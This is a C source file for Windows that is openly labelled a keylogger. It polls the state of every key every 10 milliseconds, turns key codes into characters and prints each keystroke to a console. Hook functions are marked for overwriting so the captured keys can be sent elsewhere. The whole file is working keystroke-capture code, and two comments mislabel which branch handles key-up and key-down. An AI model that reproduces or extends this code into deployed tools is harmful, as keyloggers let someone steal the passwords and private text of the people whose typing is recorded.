#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

const int ACTIVE   = 1;
const int INACTIVE = 0;

int SHIFT = 0;

char ShiftConvert( int c ){
	char v = c;
	
	if( v == '/' ) v = '?';
	if( v == '.' ) v = '>';
	if( v == ',' ) v = '<';
	if( v == ';' ) v = ':';
	if( v == 39  ) v = '"'; // 39 == '
	if( v == '[' ) v = '{';
	if( v == ']' ) v = '}';
	
	if( v == '1' ) v = '!';
	if( v == '2' ) v = '@';
	if( v == '3' ) v = '#';
	if( v == '4' ) v = '$';
	if( v == '5' ) v = '%';
	if( v == '6' ) v = '^';
	if( v == '7' ) v = '&';
	if( v == '8' ) v = '*';
	if( v == '9' ) v = '(';
	if( v == '0' ) v = ')';
	
	if( v == '-' ) v = '_';
	if( v == '=' ) v = '+';
	
	return v;
}

char VKToChar( int c ){
	char v = MapVirtualKey( c, 2 );
	
	if(!SHIFT && isalpha(v)) v = tolower(v);
	if(SHIFT) v = ShiftConvert( v );

	return v;
}

/* OVERWRITE THESE FUNCTIONS TO DETERMINE WHAT HAPPENS WHEN KEYS ARE PRESSED */

// When a key is released
void OnKeyUp( int c ){
	
}

// When a key is pressed
void OnKeyDown( int c ){
	// Print the char
	char v = VKToChar(c);
	
	if( isprint(v) )
		printf("%c", v);
	
	// If enter key, print a line-break
	if( v == 13 )
		printf("\n");
}

int main (){
	system("TITLE Keylogger");
	
	const int MAX = 255; // Range of keys
	
	int keys[MAX]; // Array of current key states
	int old[MAX]; // Array of 'last' or 'old' key states
	
	// Initialize memory in our arrays
	memset( keys, 0, MAX*sizeof(int) );
	memset( old, 0, MAX*sizeof(int) );

	/* LOOP SUMMARY
		1. record the LAST state of every key (the CURRENT before we update it)
		2. record the CURRENT state of every key
		3. compare to see if they changed
		4. sleep for 10 milliseconds so we don't over consume CPU ( probably wanna revise that ) 
	*/
	
	// Forever
    while (1){
		int i;
		
		// For each key, store state
		for(i=0;i<MAX;i++){
			int state = GetAsyncKeyState(i); // Get the current state
			old[i] = keys[i]; // Store the old state
			if(state == 0){
				keys[i] = INACTIVE;
			}else{
				keys[i] = ACTIVE;
			}
		}

		// Toss the SHIFT key state into a global variable
		SHIFT = keys[VK_SHIFT];
		
		// For each key, check if it changed, if so, we have our 'event'
		for(i=0;i<MAX;i++){
			// If a key state changed.
			if(old[i] != keys[i]){
				if(keys[i]==INACTIVE){
					// changed to ACTIVE
					OnKeyUp( i );
				}else{
					// changed to INACTIVE
					OnKeyDown( i );
				}
			}
		}		
        Sleep(10);
    }
}
